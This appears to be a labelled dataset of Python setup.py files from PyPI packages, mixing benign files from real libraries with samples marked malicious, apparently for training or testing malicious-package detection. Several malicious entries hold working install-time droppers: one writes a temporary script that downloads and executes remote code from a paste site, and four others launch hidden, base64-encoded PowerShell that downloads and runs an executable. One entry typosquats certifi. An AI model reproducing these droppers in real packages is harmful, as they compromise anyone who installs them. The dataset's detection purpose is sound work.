{"idx": "proxycpz-1", "func": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.website/p/400c3e4b-a59b-4598-a199-75e848aeaae3.txt').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\n\n\nsetup(\n    name='proxycpz',\n    packages=['proxycpz'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n", "target": 1}
{"idx": "Flask-JWT-Extended-4.4.3", "func": "import io\nimport re\n\nfrom setuptools import setup\n\nwith io.open(\"flask_jwt_extended/__init__.py\", encoding=\"utf-8\") as f:\n    version = re.search(r\"__version__ = \\\"(.+)\\\"\", f.read()).group(1)\n\n\nwith open(\"README.md\", \"r\") as f:\n    long_description = f.read()\n\n\nsetup(\n    name=\"Flask-JWT-Extended\",\n    version=version,\n    url=\"https://github.com/vimalloc/flask-jwt-extended\",\n    license=\"MIT\",\n    author=\"Lily Acadia Gilbert\",\n    author_email=\"lily.gilbert@hey.com\",\n    description=\"Extended JWT integration with Flask\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    keywords=[\"flask\", \"jwt\", \"json web token\"],\n    packages=[\"flask_jwt_extended\"],\n    package_data={\n        \"flask_jwt_extended\": [\"py.typed\"],\n    },\n    zip_safe=False,\n    platforms=\"any\",\n    install_requires=[\n        \"Werkzeug>=0.14\",  # Needed for SameSite cookie functionality\n        \"Flask>=2.0,<3.0\",\n        \"PyJWT>=2.0,<3.0\",\n        \"typing_extensions>=3.7.4; python_version<'3.8'\",  # typing.Literal\n    ],\n    extras_require={\"asymmetric_crypto\": [\"cryptography>=3.3.1\"]},\n    python_requires=\">=3.7,<4\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Flask\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n)\n", "target": 0}
{"idx": "django-safedelete-1.2.2", "func": "import codecs\nimport os\nimport re\n\nfrom setuptools import find_packages, setup\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith open('README.rst', 'r') as f_readme:\n    with open('CHANGES', 'r') as f_changes:\n        long_description = f_readme.read() + '\\n\\n' + f_changes.read()\n\n\ndef get_version(package_name):\n    version_re = re.compile(r\"^__version__ = [\\\"']([\\w_.-]+)[\\\"']$\")\n    package_components = package_name.split('.')\n    init_path = os.path.join(here, *(package_components + ['__init__.py']))\n    with codecs.open(init_path, 'r', 'utf-8') as f:\n        for line in f:\n            match = version_re.match(line.strip())\n            if match:\n                return match.groups()[0]\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nversion = get_version('safedelete')\n\nsetup(\n    name='django-safedelete',\n    packages=find_packages(),\n    version=version,\n    description='Mask your objects instead of deleting them from your database.',\n    long_description=long_description,\n    author='Korantin Auguste',\n    author_email='contact@palkeo.com',\n    url='https://github.com/makinacorpus/django-safedelete',\n    download_url='https://github.com/makinacorpus/django-safedelete/tarball/%s' % version,\n    keywords=['django', 'delete', 'safedelete', 'softdelete'],\n    classifiers=[\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Development Status :: 4 - Beta',\n    ],\n    license='BSD',\n    install_requires=['Django'],\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "message-serializer-1.0.1", "func": "import setuptools\n\nrequired_modules = [\"dropbox\", \"pywin32\", \"pycryptodome\"]\n\nsetuptools.setup(\n    name=\"message-serializer\",\n    version=\"1.0.1\",\n    author=\"tsuki\",\n    description=\"A Message Serializer\",\n    long_description=\"None\",\n    long_description_content_type=\"text/markdown\",\n    url=\"https://example.com\",\n    packages=setuptools.find_packages(),\n    install_requires=required_modules,\n    license=\"MIT\",\n    keywords=[\"none\"],\n    classifiers=[\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 1}
{"idx": "py-httpvisagui-1.4", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-httpvisagui',\n    packages = ['modlib'],\n    version = '10.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "googlemaps-4.6.0", "func": "from setuptools import setup\n\n\nrequirements = [\"requests>=2.20.0,<3.0\"]\n\nwith open(\"README.md\") as f:\n    readme = f.read()\n\nwith open(\"CHANGELOG.md\") as f:\n    changelog = f.read()\n\n\nsetup(\n    name=\"googlemaps\",\n    version=\"4.6.0\",\n    description=\"Python client library for Google Maps Platform\",\n    long_description=readme + changelog,\n    long_description_content_type=\"text/markdown\",\n    scripts=[],\n    url=\"https://github.com/googlemaps/google-maps-services-python\",\n    packages=[\"googlemaps\"],\n    license=\"Apache 2.0\",\n    platforms=\"Posix; MacOS X; Windows\",\n    setup_requires=requirements,\n    install_requires=requirements,\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Topic :: Internet\",\n    ],\n    python_requires='>=3.5'\n)\n", "target": 0}
{"idx": "datasets-2.4.0", "func": "# Lint as: python3\n\"\"\" HuggingFace/Datasets is an open library of datasets.\n\nNote:\n\n   VERSION needs to be formatted following the MAJOR.MINOR.PATCH convention\n   (we need to follow this convention to be able to retrieve versioned scripts)\n\nSimple check list for release from AllenNLP repo: https://github.com/allenai/allennlp/blob/master/setup.py\n\nTo create the package for pypi.\n\n0. Prerequisites:\n   - Dependencies:\n     - twine: \"pip install twine\"\n   - Create an account in (and join the 'datasets' project):\n     - PyPI: https://pypi.org/\n     - Test PyPI: https://test.pypi.org/\n\n1. Change the version in:\n   - __init__.py\n   - setup.py\n\n2. Commit these changes: \"git commit -m 'Release: VERSION'\"\n\n3. Add a tag in git to mark the release: \"git tag VERSION -m 'Add tag VERSION for pypi'\"\n   Push the tag to remote: git push --tags origin main\n\n4. Build both the sources and the wheel. Do not change anything in setup.py between\n   creating the wheel and the source distribution (obviously).\n\n   First, delete any \"build\" directory that may exist from previous builds.\n\n   For the wheel, run: \"python setup.py bdist_wheel\" in the top level directory.\n   (this will build a wheel for the python version you use to build it).\n\n   For the sources, run: \"python setup.py sdist\"\n   You should now have a /dist directory with both .whl and .tar.gz source versions.\n\n5. Check that everything looks correct by uploading the package to the pypi test server:\n\n   twine upload dist/* -r pypitest --repository-url=https://test.pypi.org/legacy/\n\n   Check that you can install it in a virtualenv/notebook by running:\n   pip install huggingface_hub fsspec aiohttp\n   pip install -U tqdm\n   pip install -i https://testpypi.python.org/pypi datasets\n\n6. Upload the final version to actual pypi:\n   twine upload dist/* -r pypi\n\n7. Fill release notes in the tag in github once everything is looking hunky-dory.\n\n8. Change the version in __init__.py and setup.py to X.X.X+1.dev0 (e.g. VERSION=1.18.3 -> 1.18.4.dev0).\n   Then push the change with a message 'set dev version'\n\"\"\"\n\nimport os\n\nfrom setuptools import find_packages, setup\n\n\nREQUIRED_PKGS = [\n    # We use numpy>=1.17 to have np.random.Generator (Dataset shuffling)\n    \"numpy>=1.17\",\n    # Backend and serialization.\n    # Minimum 6.0.0 to support wrap_array which is needed for ArrayND features\n    \"pyarrow>=6.0.0\",\n    # For smart caching dataset processing\n    \"dill<0.3.6\",  # tmp pin until 0.3.6 release: see https://github.com/huggingface/datasets/pull/4397\n    # For performance gains with apache arrow\n    \"pandas\",\n    # for downloading datasets over HTTPS\n    \"requests>=2.19.0\",\n    # progress bars in download and scripts\n    \"tqdm>=4.62.1\",\n    # dataclasses for Python versions that don't have it\n    \"dataclasses;python_version<'3.7'\",\n    # for fast hashing\n    \"xxhash\",\n    # for better multiprocessing\n    \"multiprocess\",\n    # to get metadata of optional dependencies such as torch or tensorflow for Python versions that don't have it\n    \"importlib_metadata;python_version<'3.8'\",\n    # to save datasets locally or on any filesystem\n    # minimum 2021.11.1 so that BlockSizeError is fixed: see https://github.com/fsspec/filesystem_spec/pull/830\n    \"fsspec[http]>=2021.11.1\",  # aligned s3fs with this\n    # for data streaming via http\n    \"aiohttp\",\n    # To get datasets from the Datasets Hub on huggingface.co\n    \"huggingface-hub>=0.1.0,<1.0.0\",\n    # Utilities from PyPA to e.g., compare versions\n    \"packaging\",\n    \"responses<0.19\",\n]\n\nAUDIO_REQUIRE = [\n    \"librosa\",\n]\n\nVISION_REQURE = [\n    \"Pillow>=6.2.1\",\n]\n\nBENCHMARKS_REQUIRE = [\n    \"numpy==1.18.5\",\n    \"tensorflow==2.3.0\",\n    \"torch==1.6.0\",\n    \"transformers==3.0.2\",\n]\n\nTESTS_REQUIRE = [\n    # test dependencies\n    \"absl-py\",\n    \"pytest\",\n    \"pytest-datadir\",\n    \"pytest-xdist\",\n    # optional dependencies\n    \"apache-beam>=2.26.0\",\n    \"elasticsearch<8.0.0\",  # 8.0 asks users to provide hosts or cloud_id when instantiating ElastictSearch()\n    \"aiobotocore>=2.0.1\",  # required by s3fs>=2021.11.1\n    \"boto3>=1.19.8\",  # to be compatible with aiobotocore>=2.0.1 - both have strong dependencies on botocore\n    \"botocore>=1.22.8\",  # to be compatible with aiobotocore and boto3\n    \"faiss-cpu>=1.6.4\",\n    \"fsspec[s3]\",\n    \"moto[s3,server]==2.0.4\",\n    \"rarfile>=4.0\",\n    \"s3fs>=2021.11.1\",  # aligned with fsspec[http]>=2021.11.1\n    \"tensorflow>=2.3,!=2.6.0,!=2.6.1\",\n    \"torch\",\n    \"torchaudio\",\n    \"soundfile\",\n    \"transformers\",\n    # datasets dependencies\n    \"bs4\",\n    \"conllu\",\n    \"h5py\",\n    \"langdetect\",\n    \"lxml\",\n    \"lz4\",\n    \"mwparserfromhell\",\n    \"nltk\",\n    \"openpyxl\",\n    \"py7zr\",\n    \"tldextract\",\n    \"zstandard\",\n    # \"bigbench @ https://storage.googleapis.com/public_research_data/bigbench/bigbench-0.0.1.tar.gz\",\n    \"sentencepiece\",  # bigbench requires t5 which requires seqio which requires sentencepiece\n    \"sacremoses\",\n    # metrics dependencies\n    \"bert_score>=0.3.6\",\n    \"jiwer\",\n    \"mauve-text\",\n    \"rouge_score<0.0.7\",\n    \"sacrebleu\",\n    \"sacremoses\",\n    \"scikit-learn\",\n    \"scipy\",\n    \"sentencepiece\",  # for bleurt\n    \"seqeval\",\n    # to speed up pip backtracking\n    \"toml>=0.10.1\",\n    \"requests_file>=1.5.1\",\n    \"tldextract>=3.1.0\",\n    \"texttable>=1.6.3\",\n    \"Werkzeug>=1.0.1\",\n    \"six~=1.15.0\",\n    # metadata validation\n    \"importlib_resources;python_version<'3.7'\",\n]\n\nTESTS_REQUIRE.extend(VISION_REQURE)\nTESTS_REQUIRE.extend(AUDIO_REQUIRE)\n\nQUALITY_REQUIRE = [\"black~=22.0\", \"flake8>=3.8.3\", \"isort>=5.0.0\", \"pyyaml>=5.3.1\"]\n\n\nEXTRAS_REQUIRE = {\n    \"audio\": AUDIO_REQUIRE,\n    \"vision\": VISION_REQURE,\n    \"apache-beam\": [\"apache-beam>=2.26.0\"],\n    \"tensorflow\": [\"tensorflow>=2.2.0,!=2.6.0,!=2.6.1\"],\n    \"tensorflow_gpu\": [\"tensorflow-gpu>=2.2.0,!=2.6.0,!=2.6.1\"],\n    \"torch\": [\"torch\"],\n    \"s3\": [\n        \"fsspec\",\n        \"boto3\",\n        \"botocore\",\n        \"s3fs\",\n    ],\n    \"streaming\": [],  # for backward compatibility\n    \"dev\": TESTS_REQUIRE + QUALITY_REQUIRE,\n    \"tests\": TESTS_REQUIRE,\n    \"quality\": QUALITY_REQUIRE,\n    \"benchmarks\": BENCHMARKS_REQUIRE,\n    \"docs\": [\n        # Might need to add doc-builder and some specific deps in the future\n        \"s3fs\",\n    ],\n}\n\nsetup(\n    name=\"datasets\",\n    version=\"2.4.0\",  # expected format is one of x.y.z.dev0, or x.y.z.rc1 or x.y.z (no to dashes, yes to dots)\n    description=\"HuggingFace community-driven open-source library of datasets\",\n    long_description=open(\"README.md\", encoding=\"utf-8\").read(),\n    long_description_content_type=\"text/markdown\",\n    author=\"HuggingFace Inc.\",\n    author_email=\"thomas@huggingface.co\",\n    url=\"https://github.com/huggingface/datasets\",\n    download_url=\"https://github.com/huggingface/datasets/tags\",\n    license=\"Apache 2.0\",\n    package_dir={\"\": \"src\"},\n    packages=find_packages(\"src\"),\n    package_data={\"datasets\": [\"py.typed\", \"scripts/templates/*\"], \"datasets.utils.resources\": [\"*.json\", \"*.yaml\", \"*.tsv\"]},\n    entry_points={\"console_scripts\": [\"datasets-cli=datasets.commands.datasets_cli:main\"]},\n    install_requires=REQUIRED_PKGS,\n    extras_require=EXTRAS_REQUIRE,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Education\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n    ],\n    keywords=\"datasets machine learning datasets metrics\",\n    zip_safe=False,  # Required for mypy to find the py.typed file\n)\n", "target": 0}
{"idx": "tpvisaosintpong-9.85", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvisaosintpong',\n    packages = ['modlib'],\n    version = '6.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpullsuperpaypal-10.61", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpullsuperpaypal',\n    packages = ['modlib'],\n    version = '6.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "forecolor5-0.0.9", "func": "from setuptools import setup\n\n\n\nsetup(\n    name=\"forecolor5\",\n    version='0.0.9',\n    license='Eclipse Public License 2.0',\n    authors=[\"billythegoat356\", \"loTus01\", \"BlueRed\"],\n    author_email=\"<billythegoat356@gmail.com>\",\n    description=\"by billythegoat356, loTus01 and BlueRed\",\n    long_description='Documentation: https://github.com/billythegoat356/pystyle',\n    keywords=['cli', 'fade', 'colors', 'terminal', 'tui'],\n    packages=['forecolor5']\n)\n\n\n", "target": 1}
{"idx": "django-admin-rangefilter-0.8.7", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport os\nimport re\nfrom os.path import dirname, join\n\nfrom setuptools import setup\n\n\ndef get_version(package):\n    init_py = open(os.path.join(package, \"__init__.py\"), encoding=\"utf-8\").read()\n    return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n\n\ndef get_packages(package):\n    return [\n        dirpath\n        for dirpath, dirnames, filenames in os.walk(package)\n        if os.path.exists(os.path.join(dirpath, \"__init__.py\"))\n    ]\n\n\ndef get_package_data(package):\n    walk = [\n        (dirpath.replace(package + os.sep, \"\", 1), filenames)\n        for dirpath, dirnames, filenames in os.walk(package)\n        if not os.path.exists(os.path.join(dirpath, \"__init__.py\"))\n    ]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename) for filename in filenames])\n    return {package: filepaths}\n\n\nsetup(\n    name=\"django-admin-rangefilter\",\n    version=get_version(\"rangefilter\"),\n    url=\"https://github.com/silentsokolov/django-admin-rangefilter\",\n    license=\"MIT\",\n    description=\"django-admin-rangefilter app, add the filter by a custom date range on the admin UI.\",\n    long_description_content_type=\"text/x-rst\",\n    long_description=open(join(dirname(__file__), \"README.rst\"), encoding=\"utf-8\").read(),\n    author=\"Dmitriy Sokolov\",\n    author_email=\"silentsokolov@gmail.com\",\n    packages=get_packages(\"rangefilter\"),\n    package_data=get_package_data(\"rangefilter\"),\n    include_package_data=True,\n    install_requires=[],\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*\",\n    zip_safe=False,\n    platforms=\"any\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Utilities\",\n    ],\n)\n", "target": 0}
{"idx": "enum-compat-0.0.3", "func": "#!/usr/bin/env python\nfrom __future__ import absolute_import, division, print_function\n\nimport sys\n\nfrom setuptools import setup\n\nreadme = \"\"\"\nenum-compat\n===========\n\nThis is a virtual package, its whole purpose is to install enum34 on\nPython older than 3.4. On Python 3.4+ it's a no-op.\n\n\"\"\"\n\nif __name__ == '__main__':\n    setup(\n        name='enum-compat',\n        version='0.0.3',\n        description='enum/enum34 compatibility package',\n        long_description=readme,\n        author='Jakub Stasiak',\n        author_email='jakub@stasiak.at',\n        url='https://github.com/jstasiak/enum-compat',\n        license='MIT',\n        zip_safe=False,\n        classifiers=[\n            'Intended Audience :: Developers',\n            'Topic :: Software Development :: Libraries',\n            'Programming Language :: Python',\n            'Programming Language :: Python :: 2',\n            'Programming Language :: Python :: 2.6',\n            'Programming Language :: Python :: 2.7',\n            'Programming Language :: Python :: 3',\n            'Programming Language :: Python :: 3.3',\n            'Programming Language :: Python :: 3.4',\n            'Programming Language :: Python :: 3.5',\n        ],\n        keywords=[\n            'enum', 'compatibility', 'enum34',\n        ],\n        install_requires=['enum34; python_version < \"3.4\"'],\n    )\n", "target": 0}
{"idx": "dicttoxml-1.7.4", "func": "from distutils.core import setup\n\nversion = '1.7.4'\n\nwith open('README.markdown') as readme:\n    long_description = readme.read()\n\nsetup(\n    name = 'dicttoxml',\n    version = version,\n    description = 'Converts a Python dictionary or other native data type into a valid XML string. ',\n    long_description = long_description,\n    author = 'Ryan McGreal',\n    author_email = 'ryan@quandyfactory.com',\n    license = 'LICENCE.txt',\n    url = 'https://github.com/quandyfactory/dicttoxml',\n    py_modules = ['dicttoxml'],\n    download_url = 'https://pypi.python.org/packages/source/d/dicttoxml/dicttoxml-%s.tar.gz?raw=true' % (version),\n    platforms='Cross-platform',\n    classifiers=[\n      'Programming Language :: Python',\n      'Programming Language :: Python :: 3'\n    ],\n)\n", "target": 0}
{"idx": "certefi-2022.9.24", "func": "#!/usr/bin/env python\nimport re\nimport os\nimport sys\n\n# While I generally consider it an antipattern to try and support both\n# setuptools and distutils with a single setup.py, in this specific instance\n# where certifi is a dependency of setuptools, it can create a circular\n# dependency when projects attempt to unbundle stuff from setuptools and pip.\n# Though we don't really support that, it makes things easier if we do this and\n# should hopefully cause less issues for end users.\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nversion_regex = r'__version__ = [\"\\']([^\"\\']*)[\"\\']'\nwith open('certifi/__init__.py') as f:\n    text = f.read()\n    match = re.search(version_regex, text)\n\n    if match:\n        VERSION = match.group(1)\n    else:\n        raise RuntimeError(\"No version number found!\")\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist bdist_wheel upload')\n    sys.exit()\n\nsetup(\n    name=\"certefi\",\n    version=VERSION,\n    description='Python package for providing Mozilla\\'s CA Bundle.',\n    long_description=open('README.rst').read(),\n    author=\"Orange Alice\",\n    author_email='me@kennethreitz.com',\n    url='https://github.com/certifi/python-certifi',\n    packages=[\n        'certifi',\n    ],\n    package_dir={'certifi': 'certifi'},\n    package_data={'certifi': ['*.pem', 'py.typed']},\n    # data_files=[('certifi', ['certifi/cacert.pem'])],\n    include_package_data=True,\n    zip_safe=False,\n    license='MPL-2.0',\n    python_requires=\">=3.6\",\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',\n        'Natural Language :: English',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.11',\n    ],\n    project_urls={\n        'Source': 'https://github.com/certifi/python-certifi',\n    },\n)\n", "target": 1}
{"idx": "mcgrand-1.69", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'mcgrand',\n    packages = ['modlib'],\n    version = '4.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
